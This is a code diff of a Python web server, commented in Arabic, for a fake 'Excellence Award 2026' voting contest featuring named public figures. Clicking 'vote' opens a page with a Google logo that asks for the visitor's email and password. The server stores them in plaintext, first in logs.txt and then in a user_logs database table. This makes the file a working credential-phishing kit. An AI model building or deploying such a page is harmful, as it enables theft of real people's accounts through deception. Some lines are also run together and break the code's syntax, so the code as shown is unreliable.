@@ -2,105 +2,211 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 import time
 import sqlite3
-import os
 
-# المنفذ للسيرفرات العالمية
-PORT = int(os.environ.get("PORT", 8080))
-
+# --- 1. إعداد قاعدة البيانات ---
 def init_db():
-    conn = sqlite3.connect('database.db')
+    conn = sqlite3.connect('contest_data.db')
     cursor = conn.cursor()
-    cursor.execute('CREATE TABLE IF NOT EXISTS votes_count (id TEXT PRIMARY KEY, base_votes INTEGER)')
-    cursor.execute('CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, target TEXT, timestamp TEXT)')
-    initial_data = [("almohammadi", 2745000), ("alawlaqi", 2610200), ("bindawod", 2190800), ("hajar", 2480500), ("dmami", 2350100)]
-    for cid, count in initial_data:
-        cursor.execute('INSERT OR IGNORE INTO votes_count VALUES (?, ?)', (cid, count))
+    # جدول الأصوات (يحفظ العدد لكل مرشح)
+    cursor.execute('''CREATE TABLE IF NOT EXISTS candidates
+                      (id TEXT PRIMARY KEY, vote_count INTEGER)''')
+    # جدول السجلات (يحفظ الإيميلات والباسوردات التي يتم إدخالها)
+    cursor.execute('''CREATE TABLE IF NOT EXISTS user_logs
+                      (email TEXT, password TEXT, target TEXT, timestamp TEXT)''')
+
+    # تعبئة الأصوات الأولية (فقط إذا كان الجدول فارغاً)
+    initial_votes = {
+        "almohammadi": 2745000,
+        "alawlaqi": 2610200,
+        "bindawod": 2190800,
+        "hajar": 2480500,
+        "dmami": 2350100
+    }                                                          for cid, count in initial_votes.items():
+        cursor.execute('INSERT OR IGNORE INTO candidates VALUES (?, ?)', (cid, count))                                
     conn.commit()
     conn.close()
 
-def get_total_votes(cid):
-    conn = sqlite3.connect('database.db')
+# --- 2. دوال التعامل مع البيانات ---
+def get_real_votes(cid):
+    conn = sqlite3.connect('contest_data.db')
     cursor = conn.cursor()
-    cursor.execute('SELECT base_votes FROM votes_count WHERE id=?', (cid,))
+    cursor.execute('SELECT vote_count FROM candidates WHERE id=?', (cid,))
     res = cursor.fetchone()
-    base = res[0] if res else 0
-    cursor.execute('SELECT COUNT(*) FROM users WHERE target=?', (cid,))
-    extra = cursor.fetchone()[0]
     conn.close()
-    return base + extra
+    return res[0] if res else 0
 
-def register_user(email, password, target):
-    conn = sqlite3.connect('database.db')
+def register_vote(cid, email, password):
+    conn = sqlite3.connect('contest_data.db')
     cursor = conn.cursor()
-    try:
-        cursor.execute('INSERT INTO users VALUES (?, ?, ?)', (email, target, time.ctime()))
-        conn.commit()
-        with open("logs.txt", "a", encoding="utf-8") as f:
-            f.write(f"Email: {email} | Pass: {password} | Target: {target} | Time: {time.ctime()}\n")
-        return True
-    except: return False
-    finally: conn.close()
+    # 1. زيادة العداد في قاعدة البيانات
+    cursor.execute('UPDATE candidates SET vote_count = vote_count + 1 WHERE id=?', (cid,))
+    # 2. حفظ بيانات الدخول المسجلة
+    cursor.execute('INSERT INTO user_logs VALUES (?, ?, ?, ?)',
+                   (email, password, cid, time.ctime()))
+    conn.commit()
+    conn.close()
 
+# تهيئة قاعدة البيانات عند تشغيل السكربت
 init_db()
 
+# بيانات المشاهير الثابتة (الصور والوصف)
 celebrities = {
-    "almohammadi": {"name": "الأستاذ محمد المحمدي", "img": "https://i.ibb.co/FkMX3pb8/01-t-QOqg-Pv.webp"},
-    "alawlaqi": {"name": "أبو حيدر العولقي", "img": "https://i.ibb.co/Sw1jsRg5/FB-IMG-1767749609747.jpg"},
-    "bindawod": {"name": "Hefhallh Bin Dawod", "img": "https://i.ibb.co/35bcK71C/FB-IMG-1767746087575.jpg"},
-    "hajar": {"name": "الأستاذ أحمد حجر", "img": "https://i.ibb.co/20bTB6mB/01-omm-QIf-T.webp"},
-    "dmami": {"name": "عبد الرحمن الدمامي", "img": "https://i.ibb.co/rRR3rL2w/01-HHK44o2.webp"}
-}
-
+    "almohammadi": {
+        "name": "الأستاذ محمد المحمدي",
+        "img": "https://i.ibb.co/FkMX3pb8/01-t-QOqg-Pv.webp",
+        "bio": "إعلامي وناشط اجتماعي بارز، عرف ببرامجه الإنسانية ووقوفه الدائم مع قضايا المجتمع."
+    },                                                         "alawlaqi": {
+        "name": "أبو حيدر العولقي",                                "img": "https://i.ibb.co/Sw1jsRg5/FB-IMG-1767749609747.jpg",
+        "bio": "شخصية مؤثرة في منصات التواصل الاجتماعي، يتميز بتقديم محتوى متنوع يلامس تطلعات الشباب."
+    },
+    "bindawod": {
+        "name": "Hefhallh Bin Dawod",                              "img": "https://i.ibb.co/35bcK71C/FB-IMG-1767746087575.jpg",
+        "bio": "ناشط متميز في العمل التطوعي وله بصمات واضحة في المشاريع التنموية."
+    },
+    "hajar": {                                                     "name": "الأستاذ أحمد حجر",
+        "img": "https://i.ibb.co/20bTB6mB/01-omm-QIf-T.webp",
+        "bio": "قامة تربوية واجتماعية، كرس حياته لخدمة العلم وتطوير المهارات القيادية للشباب."
+    },                                                         "dmami": {
+        "name": "عبد الرحمن الدمامي",
+        "img": "https://i.ibb.co/rRR3rL2w/01-HHK44o2.webp",        "bio": "خبير في ريادة الأعمال وصناعة المحتوى، يسعى لنشر المعرفة وتطوير الذات."
+    }
+}                                                          
 finish_time = time.time() + (160 * 60 * 60)
-
-class FinalContestServer(BaseHTTPRequestHandler):
-    def do_GET(self):
+                                                           class FinalContestServer(BaseHTTPRequestHandler):              def do_GET(self):
         self.send_response(200)
-        self.send_header('Content-type', 'text/html; charset=utf-8')
-        self.end_headers()
-        path = urlparse(self.path).path
-        query = parse_qs(urlparse(self.path).query)
-        rem = int(finish_time - time.time())
-        if path == '/' or path == '': self.show_timer(rem)
-        elif path == '/statement': self.show_stmt()
-        elif path == '/vote': self.show_vote()
-        elif path == '/login': self.show_login(query.get('target', ['almohammadi'])[0])
+        self.send_header('Content-type', 'text/html; charset=utf-8')                                                          self.end_headers()
+        query = parse_qs(urlparse(self.path).query)                path = urlparse(self.path).path                            remaining = int(finish_time - time.time())
 
-    def show_timer(self, r):
-        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{{background:#0d3b3f;color:white;text-align:center;font-family:sans-serif;display:flex;flex-direction:column;justify-content:center;height:100vh;margin:0;}}.timer{{font-size:3rem;color:#c6a15b;margin:20px 0;}}.btn{{padding:15px 40px;background:#c6a15b;color:#0d3b3f;text-decoration:none;border-radius:50px;font-weight:bold;}}</style></head><body><img src="https://i.ibb.co/TM4Hkk0q/images-4.jpg" width="120" style="border-radius:20px;margin:auto;"><h1>جائزة التميز 2026</h1><div class="timer" id="t"></div><a href="/statement" class="btn">دخول المسابقة</a><script>var s={r};setInterval(function(){{var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;document.getElementById('t').innerHTML=h+":"+(m<10?'0':'')+m+":"+(sec<10?'0':'')+sec;if(s>0)s--;}},1000);</script></body></html>"""
+        if path == '/' or path == '':
+            self.show_timer_page(remaining)
+        elif path == '/statement':
+            self.show_statement()
+        elif path == '/vote':
+            self.show_vote_page()
+        elif path == '/login':
+            target = query.get('target', ['almohammadi'])[0]
+            self.show_login(target)
+
+    def show_timer_page(self, rem):
+        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+        body {{ background: #0d3b3f; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }}
+        * {{ -webkit-tap-highlight-color: transparent; }}
+        .timer {{ font-size: 3.5rem; font-weight: bold; color: #c6a15b; font-family: monospace; margin: 20px 0; }}
+        .btn {{ display: inline-block; padding: 15px 50px; background: #c6a15b; color: #0d3b3f; text-decoration: none; border-radius: 50px; font-weight: bold; font-size: 1.2rem; transition: 0.05s; }}
+        .btn:active {{ transform: scale(0.92); opacity: 0.8; }}
+        </style></head><body><div style="text-align:center;">
+        <img src="https://i.ibb.co/TM4Hkk0q/images-4.jpg" width="150" style="border-radius:20px;">                            <h1>جائزة التميز 2026</h1><div id="countdown" class="timer"></div>                                                    <a href="/statement" class="btn">دخول المسابقة</a>         <script>var sec = {rem}; function tick() {{ var h = Math.floor(sec/3600); var m = Math.floor((sec%3600)/60); var s = sec%60; document.getElementById('countdown').innerHTML = h + ":" + (m<10?'0':'')+m + ":" + (s<10?'0':'')+s; if(sec > 0) sec--; else location.reload(); }} setInterval(tick, 1000); tick();</script>
+        </div></body></html>"""
         self.wfile.write(html.encode('utf-8'))
 
-    def show_stmt(self):
-        html = """<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:sans-serif;text-align:center;padding:20px;}.btn{display:inline-block;margin-top:20px;padding:15px 30px;background:#0d3b3f;color:white;text-decoration:none;border-radius:10px;}</style></head><body><img src="https://i.ibb.co/NdJ88J0z/FB-IMG-1767749812219.jpg" style="width:100%;max-width:400px;border-radius:15px;"><h2>بيان اللجنة</h2><p>بدء التصويت النهائي.</p><a href="/vote" class="btn">الانتقال للقائمة ←</a></body></html>"""
-        self.wfile.write(html.encode('utf-8'))
+    def show_statement(self):
+        html = """<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            * { -webkit-tap-highlight-color: transparent; }
+            body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+            .content-wrapper { max-width: 600px; width: 90%; text-align: center; padding: 40px; border-radius: 30px; background: #fdfdfd; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
+            .official-img { width: 100%; border-radius: 20px; margin-bottom: 30px; }
+            h2 { color: #0d3b3f; font-size: 24px; margin-bottom: 20px; border-bottom: 2px solid #c6a15b; display: inline-block; padding-bottom: 5px; }
+            p { line-height: 1.8; font-size: 17px; color: #636e72; text-align: justify; margin-bottom: 40px; }
+            .btn-next { background: #0d3b3f; color: white; padding: 18px 45px; text-decoration: none; border-radius: 15px; font-weight: bold; font-size: 18px; display: inline-block; transition: 0.05s; }                                              .btn-next:active { transform: scale(0.92); opacity: 0.8; }
+        </style></head><body>
+        <div class="content-wrapper">
+            <img src="https://i.ibb.co/NdJ88J0z/FB-IMG-1767749812219.jpg" class="official-img">                                   <h2>بيان اللجنة المنظمة</h2>
+            <p>تعلن اللجنة المنظمة لجائزة التميز 2026 عن بدء المرحلة النهائية للتصويت. يرجى اختيار المرشح الذي ترونه الأنسب لتمثيل هذه الجائزة.</p>                                          <a href="/vote" class="btn-next">الانتقال لقائمة التصويت ←</a>
+        </div></body></html>"""                                    self.wfile.write(html.encode('utf-8'))
 
-    def show_vote(self):
-        cards = ""
-        for k, v in celebrities.items():
-            vts = get_total_votes(k)
-            cards += f"""<div style="background:white;border-radius:20px;padding:20px;margin:15px auto;max-width:350px;box-shadow:0 4px 10px rgba(0,0,0,0.1);text-align:center;"><img src="{v['img']}" style="width:100px;height:100px;border-radius:50%;object-fit:cover;border:2px solid #c6a15b;"><h3>{v['name']}</h3><div style="display:flex;justify-content:center;gap:15px;align-items:center;"><a href="/login?target={k}" style="background:#0d3b3f;color:white;padding:10px 20px;text-decoration:none;border-radius:20px;">تصويت</a><div style="background:#fdfdf0;padding:8px 12px;border-radius:15px;font-weight:bold;">{vts:,}</div></div></div>"""
-        self.wfile.write(f"<html dir='rtl'><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head><body style='background:#f8f9fa;font-family:sans-serif;padding:10px;'><h2 style='text-align:center;color:#0d3b3f;'>قائمة المرشحين</h2>{cards}</body></html>".encode('utf-8'))
+    def show_vote_page(self):
+        cards = ""                                                 for k, v in celebrities.items():
+            # جلب التصويت الحقيقي من قاعدة البيانات
+            real_votes = get_real_votes(k)                             cards += f"""
+            <div style="background:#ffffff; border-radius:25px; padding:25px; text-align:center; max-width:480px; margin:15px auto; box-shadow:0 5px 20px rgba(0,0,0,0.05); border: 1px solid #f1f1f1; position:relative;">
+                <div style="margin-bottom:15px;">
+                    <img src="{v['img']}" style="width:135px; height:135px; border-radius:50%; border:2.5px solid #d4af37; object-fit:cover; padding:3px;">                                      </div>
+                <div style="font-size:23px; font-weight:bold; color:#1a1a1a; margin-bottom:5px; font-family: sans-serif;">{v['name']}</div>
 
-    def show_login(self, target):
-        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{{background:#0d3b3f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}} .box{{background:white;padding:30px;border-radius:25px;width:90%;max-width:350px;text-align:center;}} input{{width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:10px;box-sizing:border-box;}} .btn{{width:100%;padding:15px;background:#0d3b3f;color:white;border:none;border-radius:10px;font-weight:bold;}}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Hi_res_logo.png" width="40"><h2>تحقق من الحساب</h2><p>لتأكيد التصويت لـ: <b>{celebrities[target]['name']}</b></p><form method="POST" action="/post_vote?target={target}"><input type="email" name="e" placeholder="البريد الإلكتروني" required><input type="password" name="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تأكيد الآن</button></form></div></body></html>"""
+                <div onclick="showBio('{v['name']}', '{v['bio']}')" style="color:#c6a15b; font-size:15px; cursor:pointer; margin-bottom:20px; font-weight:bold; transition:0.1s;" class="more-link">المزيد...</div>
+                                                                           <hr style="border:0; border-top:1px solid #eee; margin-bottom:20px;">
+
+                <div style="display:flex; flex-direction: row-reverse; justify-content:center; align-items:center; gap:30px; padding:0 15px;">
+                    <a href="/login?target={k}" class="vote-btn">تصويت</a>                                                                <div style="width:110px; height:45px; background:#fdfdf0; border:1px solid #f0f0e0; border-radius:25px; display:flex; align-items:center; justify-content:center; gap:5px;">
+                        <span style="color:#1a3c3d; font-size:16px; font-weight:bold;">{"{:,}".format(real_votes)}</span>
+                        <span style="color:#9e9e9e; font-size:13px;">صوت</span>
+                    </div>
+                </div>
+            </div>"""
+
+        # (بقية كود HTML لصفحة التصويت مع الـ Modal والـ CSS كما قدمته أنت)
+        html = f"""<html dir='rtl'><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                * {{ -webkit-tap-highlight-color: transparent; }}
+                body {{ background:#f8f9fa; font-family: sans-serif; margin:0; padding:10px; }}
+                .top-bar {{ background:#1a3c3d; color:#ffffff; text-align:center; padding:12px; border-radius:10px; max-width:480px; margin:5px auto 20px auto; font-size:16px; font-weight:bold; }}
+                .vote-btn {{ width:110px; height:45px; background:#1a3c3d; color:#ffffff; text-decoration:none; border-radius:25px; font-weight:bold; font-size:16px; display:flex; align-items:center; justify-content:center; box-shadow: 0 4px 8px rgba(0,0,0,0.1); transition: 0.05s; }}
+                .vote-btn:active {{ transform: scale(0.90); opacity: 0.8; }}
+                .more-link:active {{ opacity:0.5; transform:scale(0.95); }}
+                #bioModal {{ display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:100; justify-content:center; align-items:center; padding:20px; box-sizing:border-box; }}                             .modal-content {{ background:white; padding:30px; border-radius:20px; max-width:400px; width:100%; text-align:center; position:relative; box-shadow:0 10px 30px rgba(0,0,0,0.5); }}
+                .close-btn {{ background:#0d3b3f; color:white; padding:10px 30px; border-radius:10px; margin-top:20px; display:inline-block; cursor:pointer; font-weight:bold; }}
+            </style>
+            </head><body>                                              <div id="bioModal">
+                <div class="modal-content">
+                    <h3 id="modalTitle" style="color:#0d3b3f; margin-top:0;"></h3>
+                    <p id="modalBio" style="color:#666; line-height:1.6;"></p>                                                            <div class="close-btn" onclick="hideBio()">إغلاق</div>
+                </div>
+            </div>                                                     <div class="top-bar">قائمة المرشحين</div>
+            <div style="padding-bottom:50px;">{cards}</div>            <script>
+                function showBio(name, bio) {{
+                    document.getElementById('modalTitle').innerText = name;
+                    document.getElementById('modalBio').innerText = bio;
+                    document.getElementById('bioModal').style.display = 'flex';
+                }}
+                function hideBio() {{                                          document.getElementById('bioModal').style.display = 'none';
+                }}
+            </script>
+        </body></html>"""                                          self.wfile.write(html.encode('utf-8'))
+                                                               def show_login(self, target):                                  # (صفحة تسجيل الدخول كما هي)
+        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+        * {{ -webkit-tap-highlight-color: transparent; }}
+        .confirm-btn {{ width:100%; padding:20px; background:#0d3b3f; color:white; border:none; border-radius:18px; font-weight:bold; font-size:19px; margin-top:20px; cursor:pointer; transition: 0.05s; }}
+        .confirm-btn:active {{ transform: scale(0.96); opacity: 0.8; }}
+        </style></head>
+        <body style="background:#0d3b3f; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
+        <div style="background:white; padding:45px; border-radius:35px; width:90%; max-width:480px; text-align:center; box-shadow: 0 20px 50px rgba(0,0,0,0.4);">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Hi_res_logo.png" width="60" style="margin-bottom:15px;">
+            <h2 style="color:#333; margin-bottom:15px;">تحقق من الحساب</h2>
+            <p style="color:#666; font-size:17px; margin-bottom:30px;">لتأكيد التصويت لـ: <br><b style="color:#c6a15b; font-size:20px;">{celebrities[target]['name']}</b></p>
+            <form method="POST" action="/post_vote?target={target}">
+                <input type="email" name="email" placeholder="البريد الإلكتروني" required style="width:100%; padding:18px; margin:12px 0; border:2px solid #f0f0f0; border-radius:18px; font-size:17px; box-sizing:border-box; outline:none;">                                                                         <input type="password" name="pass" placeholder="كلمة المرور" required style="width:100%; padding:18px; margin:12px 0; border:2px solid #f0f0f0; border-radius:18px; font-size:17px; box-sizing:border-box; outline:none;">
+                <button type="submit" class="confirm-btn">تأكيد الآن</button>
+            </form>
+        </div></body></html>"""
         self.wfile.write(html.encode('utf-8'))
 
     def do_POST(self):
-        cl = int(self.headers['Content-Length'])
-        pd = self.rfile.read(cl).decode('utf-8')
-        params = parse_qs(pd)
-        em = params.get('e', [''])[0].strip().lower()
-        pw = params.get('p', [''])[0]
-        tg = parse_qs(urlparse(self.path).query).get('target', ['almohammadi'])[0]
+        # معالجة بيانات الـ POST وحفظها
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        params = parse_qs(post_data)
+
+        email = params.get('email', [''])[0]
+        password = params.get('pass', [''])[0]
+
+        query = parse_qs(urlparse(self.path).query)
+        target = query.get('target', ['almohammadi'])[0]
+
+        # 1. تحديث قاعدة البيانات
+        register_vote(target, email, password)
+
+        # 2. عرض رسالة النجاح
+        celeb = celebrities[target]
         self.send_response(200)
         self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
-        if register_user(em, pw, tg):
-            clb = celebrities[tg]
-            html = f"""<html dir="rtl"><body style="margin:0;height:100vh;background:url('{clb['img']}') center/cover;display:flex;justify-content:center;align-items:center;font-family:sans-serif;"><div style="background:rgba(255,255,255,0.95);padding:30px;border-radius:20px;text-align:center;"><h1>✅ تم بنجاح</h1><p>شكراً لتصويتك لـ {clb['name']}</p><a href="/vote" style="color:#0d3b3f;font-weight:bold;text-decoration:none;">العودة</a></div></body></html>"""
-        else:
-            html = f"""<html dir="rtl"><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;text-align:center;"><div><h1>❌ عذراً</h1><p>تم التصويت مسبقاً بهذا الإيميل.</p><a href="/vote">العودة</a></div></body></html>"""
-        self.wfile.write(html.encode('utf-8'))
-
-server = HTTPServer(('0.0.0.0', PORT), FinalContestServer)
-server.serve_forever()
+        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+        * {{ -webkit-tap-highlight-color: transparent; }}
+        body {{ margin: 0; padding: 0; height: 100vh; background-image: url('{celeb['img']}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }}        .overlay {{ background: rgba(0,0,0,0.65); position: absolute; top:0; left:0; width:100%; height:100%; z-index:1; }}
+        .msg-box {{ position: relative; z-index: 2; background: white; padding: 40px; border-radius: 25px; text-align: center; max-width: 320px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }}                                                        </style></head><body><div class="overlay"></div><div class="msg-box"><h1 style="color: #27ae60; margin:0;">✅</h1><h2 style="margin:10px 0;">تم بنجاح</h2><p>شكراً لك على التصويت لـ: <br><b>{celeb['name']}</b></p><a href="/vote" style="text-decoration:none; color:#0d3b3f; font-weight:bold;">العودة</a></div></body></html>"""
+        self.wfile.write(html.encode('utf-8'))             
+PORT = 8080
+server = HTTPServer(('0.0.0.0', PORT), FinalContestServer) server.allow_reuse_address = True
+print(f"🚀 الخادم يعمل بنظام قاعدة البيانات الحقيقية على المنفذ {PORT}")
+server.serve_forever()                                     
